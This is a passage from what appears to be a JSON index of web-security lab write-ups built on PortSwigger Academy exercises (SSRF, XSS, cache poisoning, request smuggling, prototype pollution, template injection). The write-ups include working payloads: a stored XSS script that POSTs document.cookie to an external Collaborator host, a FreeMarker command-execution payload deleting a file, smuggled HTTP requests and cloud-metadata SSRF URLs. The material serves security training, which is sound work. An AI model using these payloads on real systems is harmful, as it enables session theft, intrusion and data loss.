requests to an external server that you control, and then monitor your server logs for requests from the target. Being able to generate an outbound request from the target server alone is not an exploitable issue. Since you cannot use blind SSRFs to read internal files or access internal services, you need to confirm their exploitability by trying to explore the internal network with the SSRF. Make requests to various target ports and see if server behaviour differs between commonly open and closed ports. Bypassing protections  What if you submit an SSRF payload, but the server returns this response? Error. Requests to this address are not allowed. Please try again. This SSRF was blocked by a protection mechanism, possibly a URL allowlist or blocklist. The site may have protection mechanisms implemented, but this does not mean that the protection is complete. Allowlists are generally the hardest to bypass, because they are, by default, stricter than blocklists. But getting around them is still possible if you can find an open redirect vulnerability within the allowlisted domains. If you find one, you can request an allowlisted URL that redirects to an internal URL. Since applications often need to fetch resources from a variety of internet sources, most SSRF protection mechanisms come in the form of a blocklist. If you’re faced with a blocklist, there are many ways of tricking the server. Fooling it with redirects . Using IPv6 addresses. Tricking the server with DNS. Switching out the encoding. Escalation  SSRF can be anywhere from harmless to catastrophic. This depends on a number of factors like the visibility of the response and which internal hosts are accessible. What may be possible with an SSRF depends on the internal services found on the network. SSRF can maybe be used to scan the network for reachable hosts, port-scan internal machines to fingerprint internal services, collect instance metadata, bypass access controls, exfiltrate confidential data, and even execute code on reachable machines. At its absolute worst, SSRF vulnerabilities could result in a full compromise of cloud environments, with internal administrative dashboards being exposed and internal hosts being exploited. Portswigger lab writeups  Basic SSRF against the local server Basic SSRF against another back-end system SSRF with blacklist-based input filter SSRF with filter bypass via open redirection vulnerability Blind SSRF with out-of-band detection SSRF with whitelist-based input filter Blind SSRF with Shellshock exploitation Scan the network  Reachable machines are other network hosts that can be connected to via the current machine. These internal machines might host databases, internal websites, and otherwise sensitive functionalities that can be exploited. Pulling AWS instance metadata  Amazon Elastic Compute Cloud (EC2), offers an instance metadata tool that enables EC2 instances to access data about themselves by querying the API endpoint at 169.254.169.254 . http://169.254.169.254/latest/meta-data/ Use this URL in an endpoint vulnerable to SSRF: https://public.example.com/proxy?url=http://169.254.169.254/latest/meta-data/ These API endpoints are accessible by default unless network admins specifically block or disable them. The information these services reveal is often extremely sensitive and could allow attackers to escalate SSRFs to serious information leaks and even RCE . Google Cloud metadata  If the company uses Google Cloud, query the Google Instance Metadata API instead. Google implements additional security measures for its API endpoints, so querying Google Cloud Metadata APIv1 requires one of these special headers: Metadata-Flavor: Google X-Google-Metadata-Request: True These headers offer protection against SSRFs because most often during an SSRF, you cannot specify special headers for the forged request. We will need to find a way to forge the required headers to request instance metadata for targets that use Google Cloud. Exploiting blind SSRFs  Because blind SSRFs don’t return a response or error message, their exploitation is often limited to network mapping, port scanning, and service discovery. And because you can’t extract information directly from the target server, this exploitation relies heavily on inference. Yet by analysing HTTP status codes and server response times, we can often achieve results similar to regular SSRF. Use what you’ve found by scanning the network, identifying services, and pulling instance metadata to execute attacks that have impact. It may be possible to bypass access controls , leak confidential information , and execute code . Remediation  In some cases, it is not necessary to take user input to define the location of a server-side request. It is better to leave it out to be on the safe side and generate the request URLs with static values on the server side. It is common to apply regular expressions and simple blacklists to user input, in order to mitigate SSRF and similar attacks. Blacklists are an ineffective method of security control. Attackers can easily discover ways to get around them. If the hosts that need to be accessed are a finite set, implement an allowlist. When a user sends a request, check that the URL or domain from that request corresponds to one in the allowlist, if it doesn’t, drop the request. Response handling: On no account should the raw response body received from the request initiated by the server be transferred to the client. Disable unused URL schemas: Deny attackers the ability to utilize the application to carry out requests via potentially harmful schemas, including dict:// , file:/// , and gopher:// . Services like Redis, MongoDB, Elasticsearch, and Memcached do not demand...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fa0a54370da1519b5ae4388483dd922d",
    "u": "https://webapp.tymyrddin.dev/docs/business/4",
    "t": "Flawed enforcement of business rules ",
    "c": "Flawed enforcement of business rules  Description  This lab has a logic flaw in its purchasing workflow. Reproduction and proof of concept  Log in with wiener:peter and notice that there is a coupon code, NEWCUST5 . At the bottom of the page, sign up to the newsletter. You receive another coupon code, SIGNUP30 . Add the leather jacket to your cart. Go to the checkout and apply both of the coupon codes to get a discount on your order. Try applying the codes more than once. Notice that if you enter the same code twice in a row, it is rejected because the coupon has already been applied. However, if you alternate between the two codes, you can bypass this control. Reuse the two codes enough times to reduce your order total to less than your remaining store credit. Complete the order to solve the lab. Exploitability  An attacker will need to log in and buy a “Lightweight l33t leather jacket” for a price way less than intended.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b343043c4bc9218a3e2965f21a8ec005",
    "u": "https://webapp.tymyrddin.dev/docs/cache/10",
    "t": "Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria ",
    "c": "Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria  Description  This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. The cache used by this lab has stricter criteria for deciding which responses are cacheable, so a study of the cache behaviour is necessary. Reproduction and proof of concept  With Burp running, open the website’s home page. In Burp, go to Proxy -> HTTP history and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater. Use Param Miner to identify that the X-Forwarded-Host header is supported. Add a cache buster to the request, as well as the X-Forwarded-Host header with an arbitrary hostname, such as example.com . Notice that this header overwrites the data.host variable, which is passed into the initGeoLocate() function. Study the initGeoLocate() function in /resources/js/geolocate.js and notice that it is vulnerable to DOM-XSS due to the way it handles the incoming JSON data. Go to the exploit server and change the file name to match the path used by the vulnerable response /resources/json/geolocate.json ; In the head, add the header Access-Control-Allow-Origin: * to enable CORS; In the body, add a malicious JSON object that matches the one used by the vulnerable website. However, replace the value with a suitable XSS payload: Store the exploit. Back in Burp, find the request for the home page and send it to Burp Repeater. In Burp Repeater, change the X-Forwarded-Host header value to that of the exploit server. Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers. If this does not work, notice that the response contains the Set-Cookie header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set. 1Send this new request to Burp Repeater and repeat the steps above until you successfully poison the cache. Remove the buster, and to simulate the victim, load the URL in the browser and make sure that the alert() fires. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved. Exploitability  An attacker will need to use the X-Forwarded-Host header value to poison the cache with a response that executes alert(document.cookie) in the visitor’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1c0112defe6771c753b5d065db0776f4",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/3",
    "t": "HTTP request smuggling, obfuscating the TE header ",
    "c": "HTTP request smuggling, obfuscating the TE header  Description  This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. Reproduction and proof of concept  In Burp Suite, go to the Repeater menu and ensure that the “Update Content-Length” option is unchecked. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: cow 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 The second response should say: Unrecognized method GPOST . Exploitability  An attacker will need to smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bba6384243d4e2d83eafad68c72842ec",
    "u": "https://webapp.tymyrddin.dev/docs/acl/4",
    "t": "User role can be modified in user profile ",
    "c": "User role can be modified in user profile  Description  This lab has an admin panel at /admin . It’s only accessible to logged-in users with a roleid of 2 . Reproduction and proof of concept  Log in with credentials wiener:peter and access the account page. Use the provided feature to update the email address associated with your account. The response contains your role ID. Send the email submission request to Burp Repeater, add \"roleid\":2 into the JSON in the request body, and resend it. POST /my-account/change-email HTTP/1.1 Host: 0ac800ce047e4849c10f5431004d000a.web-security-academy.net Cookie: session=kuDuAjpjB1Yrs17aMophAZpeAQf8QQLJ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: text/plain;charset=UTF-8 Content-Length: 50 Origin: https://0ac800ce047e4849c10f5431004d000a.web-security-academy.net Referer: https://0ac800ce047e4849c10f5431004d000a.web-security-academy.net/my-account Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close {\"email\":\"test@normal-user.net\", \"roleid\":2 } The response shows your roleid has changed to 2. Browse to /admin and delete carlos . Exploitability  An attacker will need to access the admin panel, and use it to delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ec735082c1633f2692525e2b4ee354af",
    "u": "https://webapp.tymyrddin.dev/docs/cache/12",
    "t": "Cache key injection ",
    "c": "Cache key injection  Description  This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site’s home page using Chrome. Reproduction  The redirect at /login excludes the parameter utm_content from the cache key using a flawed regex . This allows appending arbitrary unkeyed content to the lang parameter: /login?lang=en?utm_content=fire The page at /login/ has an import from /js/localize.js . This is vulnerable to client-side parameter pollution via the lang parameter because it doesn’t URL-encode the value. The login page references an endpoint at /js/localize.js that is vulnerable to response header injection via the Origin request header, provided the cors parameter is set to 1 . Use the Pragma: x-get-cache-key header to identify that the server is vulnerable to cache key injection, meaning the header injection can be triggered via a crafted URL. Combine these four behaviours by poisoning the cache with following two requests: GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1 Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$ GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1 This will poison /login?lang=en such that it redirects to a login page with a poisoned localization import that executes alert(1) , solving the lab. PoC  Exploitability  An attacker will need to combine the vulnerabilities to execute alert(1) in the victim’s browser. and make use of the Pragma: x-get-cache-key header in order to solve this lab.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "681ab3dee82a2d5bc4bb55668b4c3d03",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/8",
    "t": "Bypassing flawed input filters for server-side prototype pollution ",
    "c": "Bypassing flawed input filters for server-side prototype pollution  This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. Reproduction and PoCs  Study the address change feature  Log in with wiener:peter and visit the account page. Submit the form for updating your billing and delivery address. In Burp, go to the Proxy -> HTTP history tab and find the POST /my-account/change-address request. When submitting the form, the data from the fields is sent to the server as JSON. The server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information. Send the request to Burp Repeater. Identify a prototype pollution source  In Repeater, add a new property to the JSON with the name __proto__ , containing an object with a json spaces property. \"__proto__\": { \"json spaces\":10 } Send the request. In the Response panel, switch to the Raw tab. The JSON indentation appears to be unaffected. Modify the request to try polluting the prototype via the constructor property instead: \"constructor\": { \"prototype\": { \"json spaces\":10 } } Resend the request. In the Response panel, go to the Raw tab. The JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype. Identify a gadget  Look at the additional properties in the response body. Notice the isAdmin property, which is currently set to false. Craft an exploit  Modify the request to try polluting the prototype with your own isAdmin property: \"constructor\": { \"prototype\": { \"isAdmin\":true } } Send the request. The isAdmin value in the response has been updated. This suggests that the object doesn’t have its own isAdmin property, but has instead inherited it from the polluted prototype. In the browser, refresh the page and confirm that you now have a link to access the admin panel. Go to the admin panel and delete the user carlos to solve the lab. Exploitability  An attacker will need to find a prototype pollution source that can be used to add arbitrary properties to the global Object.prototype ; identify a gadget property that can be used to escalate privileges; and access the admin panel and delete the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e0c7c8e8f86f3589d5cf56ced79c6b3a",
    "u": "https://webapp.tymyrddin.dev/docs/sockets/2",
    "t": "Manipulating the WebSocket handshake to exploit vulnerabilities ",
    "c": "Manipulating the WebSocket handshake to exploit vulnerabilities  Description  This online shop has a live chat feature implemented using WebSockets. It has an aggressive but flawed XSS filter. Reproduction and proof of concept  Click Live chat and send a chat message. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message. Right-click on the message and select “Send to Repeater”. Edit and resend the message containing a basic XSS payload, such as: <img src=1 onerror='alert(1)'> Observe that the attack has been blocked, and that your WebSocket connection has been terminated. Click Reconnect , and observe that the connection attempt fails because your IP address has been banned. Add the X-Forwarded-For header to the handshake request to spoof the IP address: X-Forwarded-For: 1.1.1.1 Click “Connect” to successfully reconnect the WebSocket. Send a WebSocket message containing an obfuscated XSS payload, such as: <img src=1 oNeRrOr=alert`1`> Exploitability  An attacker will need to use a WebSocket message to trigger an alert() popup in the support agent’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "34ff262530661116353bf7f35846870c",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/1",
    "t": "HTTP request smuggling, basic CL.TE vulnerability ",
    "c": "HTTP request smuggling, basic CL.TE vulnerability  Description  This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method. Reproduction and proof of concept  Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G The second response should say: Unrecognized method GPOST . Exploitability  An attacker will need to smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "88ad33328c47ec11741b1dc42bcb5a52",
    "u": "https://webapp.tymyrddin.dev/docs/ssrf/5",
    "t": "Blind SSRF with out-of-band detection ",
    "c": "Blind SSRF with out-of-band detection  Description  This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. Reproduction and proof of concept  In Burp Suite Professional, go to the Burp menu and launch the Burp Collaborator client. Click “Copy to clipboard” to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open. Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater. Change the Referer header value to use the generated Burp Collaborator domain in place of the original domain. Send the request. Go back to the Burp Collaborator client window, and click “Poll now”. If you don’t see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. Exploitability  An attacker will need to use the analytics functionality to cause an HTTP request to the public Burp Collaborator server. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, an attacker must use Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6bb0e458a76fcea818809005f0a5395c",
    "u": "https://webapp.tymyrddin.dev/docs/xss/9",
    "t": "Reflected XSS into a JavaScript string with angle brackets HTML encoded ",
    "c": "Reflected XSS into a JavaScript string with angle brackets HTML encoded  Description  The website in this lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. Also see the HackTricks XSS page, in the section on Inside JavaScript code . Reproduction and proof of concept  Put a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. <script> var searchTerms = '&lt;alphanumeric'; document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\">'); </script> The random string has been reflected inside a JavaScript string: The script accepts input, assigns it to the variable searchTerms , and does a document.write with the encoded URL using encodeURIComponent . Replace the input with this payload to break out of the JavaScript string and inject an alert: '-alert('XSS')-'",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4359515dd16d4dee50bc088709622dfc",
    "u": "https://webapp.tymyrddin.dev/docs/dom/2",
    "t": "DOM XSS using web messages and a JavaScript URL ",
    "c": "DOM XSS using web messages and a JavaScript URL  Description  This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. Reproduction and proof of concept  Analysis: <script> window.addEventListener('message', function(e) { var url = e.data; if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) { location.href = url; } }, false); </script> The home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() check that looks for the strings http: or https: anywhere within the web message. It also contains the sink location.href . And see Window.postMessage() : In this lab, a payload can be transported in the message, while the targetOrigin is the target domain or a * as a synonym for the full world: <iframe src=\"URL\" onload=\"contentWindow.postMessage('PAYLOAD','*');\"> Go to the exploit server and add this iframe to the body: Store the exploit and deliver it to the victim. This script sends a web message containing an arbitrary JavaScript payload, along with the string http: . The second argument specifies that any targetOrigin is allowed for the web message. When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the http: string and proceeds to send the payload to the location.href sink, where the print() function is called. Exploitability  An attacker needs to construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "43e1ed4598eb23f438a136733c586227",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Notes on techniques Why?  Tackle challenges in determining and exploring vulnerabilities in web applications. How?  Cross-site scripting (XSS) Open redirection Clickjacking Cross-site request forgery (CSRF) Insecure direct object references (IDOR) SQL injection Race conditions Server-side request forgery (SSRF) Insecure deserialisation XML external entity (XXE) injection Web cache poisoning HTTP Request smuggling Template injection (SSTI) Authentication vulnerabilities Single-sign-on security (SSO) Broken access control Application logic errors HTTP Host header attacks Websocket vulnerabilities Remote code execution (RCE) Same-origin policy (SOP) Information disclosure File uploads JSON web tokens attacks Prototype pollution",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5847b3329669e3c5ea9eb607924f5ac7",
    "u": "https://webapp.tymyrddin.dev/docs/upload/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy File upload vulnerabilities Labs Introduction  What?  In almost every web application there is functionality for uploading files. This file may be in form of text, video, image, etc. Why?  File upload functions can be used as a powerful vector for a number of high-severity attacks. How?  File uploads Remote code execution via web shell upload Web shell upload via Content-Type restriction bypass Web shell upload via path traversal Web shell upload via extension blacklist bypass Web shell upload via obfuscated file extension Remote code execution via polyglot web shell upload Web shell upload via race condition Race conditions",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "602afd03dcf9f8a39470093bc9ae6dab",
    "u": "https://webapp.tymyrddin.dev/docs/xss/14",
    "t": "Exploiting cross-site scripting to steal cookies ",
    "c": "Exploiting cross-site scripting to steal cookies  Description  The website in this lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. Reproduction and proof of concept  Using Burp Suite Professional, go to the Collaborator tab. Click Copy to clipboard to copy a unique Burp Collaborator payload to the clipboard. Submit the payload in a blog comment, inserting your Burp Collaborator subdomain where indicated. This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server. <script> fetch('https://kocnw0mrbkcqli3hz8v75eaoofu6iw6l.oastify.com', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script> The request contains csrf=v2vsUOVw1AzS5JTcIE0gfOxlGpqzwju5&postId=10&comment=%3Cscript%3E%0D%0A++++fetch%28%27https%3A%2F%2Fkocnw0mrbkcqli3hz8v75eaoofu6iw6l.oastify.com%27%2C+%7B%0D%0A++++method%3A+%27POST%27%2C%0D%0A++++mode%3A+%27no-cors%27%2C%0D%0A++++body%3Adocument.cookie%0D%0A++++%7D%29%3B%0D%0A%3C%2Fscript%3E&name=Evil&email=evil%40doer.com&website= Go back to the Collaborator tab, and click “Poll now”. You should see an HTTP interaction. If you don’t see any interactions listed, wait a few seconds and try again. Take a note of the value of the victim’s cookie in the POST body. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user’s session, you can use the same cookie in a request to /my-account to load the admin user’s account page. Exploitability  To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator’s default public server, meaning Burp Pro. And there is an alternative solution to this lab that does not require Burp Collaborator: Make the victim post their session cookie within a blog comment by exploiting the XSS to perform CSRF. This exposes the cookie publicly, and discloses evidence that the attack was performed.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "399f1ba1f591c7959e0db1f3b55162df",
    "u": "https://webapp.tymyrddin.dev/docs/dom/1",
    "t": "DOM XSS using web messages ",
    "c": "DOM XSS using web messages  This lab demonstrates a simple web message vulnerability. Reproduction and proof of concept  The home page contains an addEventListener() call that listens for a web message. <script> window.addEventListener('message', function(e) { document.getElementById('ads').innerHTML = e.data; }) </script> Create payload: <iframe src=\"https://LAB-ID.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('<img src=1 onerror=print()>','*')\"> When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads , takes the content of the web message and inserts it into the div with the ID ads . However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute the payload. Store the exploit in the exploit server and Deliver it to the victim . Exploitability  An attacker needs to use the exploit server to post a message to the target site that causes the print() function to be called.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ce75a8a3a20fdf3612e3ffd6983aec10",
    "u": "https://webapp.tymyrddin.dev/docs/ssrf/6",
    "t": "SSRF with whitelist-based input filter ",
    "c": "SSRF with whitelist-based input filter  Description  This lab has a stock check feature which fetches data from an internal system. Reproduction and proof of concept  Visit a product, click Check stock , intercept the request in Burp Suite, and send it to Burp Repeater. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist. Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials. Append a # to the username and observe that the URL is now rejected. Double-URL encode the # to %2523 and observe the extremely suspicious “Internal Server Error” response, indicating that the server may have attempted to connect to username . To access the admin interface and delete the target user, change the URL to: Exploitability  An attacker will need to change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos . The developer has deployed an anti-SSRF defense the attacker will need to bypass.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "53b8f4925f71e37be8840c017eebd4a3",
    "u": "https://webapp.tymyrddin.dev/docs/ssti/3",
    "t": "Server-side template injection using documentation ",
    "c": "Server-side template injection using documentation  Description  This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos’s home directory. Reproduction and proof of concept  Log in with content-manager:C0nt3ntM4n4g3r and edit one of the product description templates. Notice that this template engine uses the syntax ${someExpression} to render the result of an expression on the page. Either enter your own expression or change one of the existing ones to refer to an object that doesn’t exist, such as ${hackingit} , and save the template. The error message in the output shows that the Freemarker template engine is being used. Test FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> hackinit [in template \"freemarker\" at line 6, column 11] ... Study the Freemarker documentation and find that appendix contains an FAQs section with the question Can I allow users to upload templates and what are the security implications? . The answer describes how the new() built-in can be dangerous. Go to the “Built-in reference” section of the documentation and find the entry for new() . This entry further describes how new() is a security concern because it can be used to create arbitrary Java objects that implement the TemplateModel interface. Load the JavaDoc for the TemplateModel class, and review the list of All Known Implementing Classes . Observe that there is a class called Execute , which can be used to execute arbitrary shell commands. Either attempt to construct your own exploit, or use @albinowax’s exploit and adapt it as follows: <#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"rm /home/carlos/morale.txt\") } Remove the invalid syntax that you entered earlier, and insert your new payload into the template. Save the template to solve the lab. Exploitability  An attacker will need to identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos’s home directory. An account is available: content-manager:C0nt3ntM4n4g3r .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "221d9fc8754fc640b5c3364f78dd042f",
    "u": "https://webapp.tymyrddin.dev/docs/acl/3",
    "t": "User role controlled by request parameter ",
    "c": "User role controlled by request parameter  Description  This lab has an admin panel at /admin , which identifies administrators using a forgeable cookie. Reproduction and proof of concept  Browse to /admin and observe that you can’t access the admin panel. Browse to the login page. In Burp Proxy, turn interception on and enable response interception. Login with credentials wiener:peter , and forward the resulting request in Burp. Observe that the response sets the cookie Admin=false . Change it to Admin=true . Load the admin panel (keep setting Admin to true ) and delete carlos . Exploitability  An attacker will need to access the admin panel, and use it to delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9b26e708256e46de138c6e05e9aa3002",
    "u": "https://webapp.tymyrddin.dev/docs/dom/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy DOM-based vulnerabilities Labs Introduction  What?  DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink. Why?  Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data. How?  DOM XSS using web messages DOM XSS using web messages and a JavaScript URL DOM XSS using web messages and JSON.parse DOM-based open redirection DOM-based cookie manipulation Exploiting DOM clobbering to enable XSS Clobbering DOM attributes to bypass HTML filters",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a87802c4c28e82b33d7846d0651bec49",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/cache",
    "t": "Web cache poisoning ",
    "c": "Web cache poisoning  Web cache poisoning uses a variety of methods to sneak modified (usually malicious) data into a web cache and have it returned to a client instead of legitimate cached content. Modifying cache content is not an attack in itself but just a technique for delivering payloads, making web cache poisoning as dangerous as the underlying vulnerability that is targeted. While not easy to do, it can also be hard to detect and troubleshoot, making it an interesting tool for attackers and an important point for penetration testing and bug hunting. Steps  Check what kind of caching is used and detect web cache hits and misses. Identify and evaluate unkeyed inputs. Web cache poisoning attacks are only possible when these inputs can be used to generate other responses dynamically or if the server reflects this input in its response without adequate validation or input sanitation. understand how the web server processes the unkeyed input to elicit a malicious response from the back-end server successfully. Get the response cached: The success of a web caching attack depends on the successful storage of the harmful response in cache memory. Use trial & error to examine the behaviour of the cache. Unkeyed inputs  Reflected unkeyed headers: If the application directly reflects the value of an unkeyed header in the response, it opens the door to cache poisoning. Its value is not part of the cache key. If the attacker sends a request where only this header is maliciously modified, the response to this request will be cached, with the malicious payload targeting, for example, an XSS vulnerability. Users subsequently requesting content that matches the same cache key will receive the malicious version from the cache. Unkeyed port: If the port is not part of the cache key, it may be possible to perform a denial of service (DoS) attack by poisoning the cache with an inaccessible port number. If an attacker sends a request that includes such a port number and the error response is cached, users requesting the same URL without the port will immediately get the cached error instead of the expected page content. This will render the page inaccessible to users. Unkeyed request method: Sometimes the HTTP request method (GET, POST, PUT, etc.) is not be part of the cache key. If the application is also vulnerable to parameter pollution, it may be possible to send a POST request containing a malicious payload that modifies a parameter for an XSS attack. The poisoned response will then be cached and because the cache key does not account for the HTTP method, it will be delivered to clients that send a normal GET request matching the same cache key. Unkeyed query string: If the query string of a request is unkeyed and reflected in the response, it may be possible to inject a malicious payload into a query parameter and cache the response. Clients sending a matching request with no query string would then receive the poisoned response. Because the attack is a typical script injection, it effectively turns a reflected XSS into a stored XSS, with the script stored in the web cache. If used directly, it is not hard to detect, but it may evade detection in more complex scenarios. Fat GET requests  If an application accepts non-standard GET requests that have a body (making them fat) and the request body is unkeyed and reflected in the response, it may be possible to include a malicious payload in the GET request, and the response will be cached (because the request body is not part of the key). Users sending a regular GET request that matches the same cache key will receive the poisoned response. In some cases, it may also be possible to use the X-HTTP-Method-Override header to trick the application into treating a fat GET request as a normal POST request. Cache busting  A cache-buster is a unique piece of code that prevents a browser from reusing an element it has already seen and cached, or saved, to a temporary memory file. GET /?parameter1=whatever&parameter2=evil HTTP/1.1 A cache-buster doesn’t stop a browser from caching an element, it just prevents it from reusing it. For dual caches, Burp’s param miner can add a dynamic cache buster to each request made, which can be helpful for bypassing one cache and focusing on the other. Escalation  The impact of web cache poisoning is heavily dependent on several key factors: What can successfully get cached, the amount of traffic on the affected page, and for more targeted attacks, who is likely to visit the poisoned page. Portswigger lab writeups  Web cache poisoning with an unkeyed header Web cache poisoning with an unkeyed cookie Web cache poisoning with multiple headers Targeted web cache poisoning using an unknown header Web cache poisoning via an unkeyed query string Web cache poisoning via an unkeyed query parameter Parameter cloaking Web cache poisoning via a fat GET request URL normalization Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria Combining web cache poisoning vulnerabilities Cache key injection Internal cache poisoning Remediation  Cache poisoning is just another vehicle for attackers to deliver their payloads. When hit by a cache poisoning attempt that injects an XSS payload into the cache, it will be harmless if the application is not vulnerable to that type of cross-site scripting. Use secure coding practices at every stage of the development and operations pipeline. Still, to minimise attackers using the web cache poisoning vehicle, these are some recommendations for configuring the web server cache: If the application only uses default ports, strip the port number from the Host header before generating the cache key. Poisoning via an unkeyed port value can lead to DoS. Caching only GET and HEAD requests reduces the risk of poisoning via an unkeyed request method. POST and other HTTP commands are designed to trigger an operation on the server, and responses to state-changing requests are often unique, hence there is no performance benefit to caching their responses anyway. Reject non-standard GET requests with a body (fat GET requests). Even better, do not have an application send such requests. As a first step for cache poisoning, attackers try to figure out what kind of caching is used and look at web cache hits and misses. Removing caching-specific headers as part of a defense-in-depth strategy can make such information gathering much more difficult. Note: Disabling these headers might come at a cost for client-side caching in the browser. Resources  Portswigger: Web cache poisoning Portswigger: Bypassing Web Cache Poisoning Countermeasures Snyk: Cache poisoning in popular open source packages Cache Poisoning at Scale",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4f1debf98f6c45ac85984a1b4471cbe4",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/3",
    "t": "Client-side prototype pollution via flawed sanitisation ",
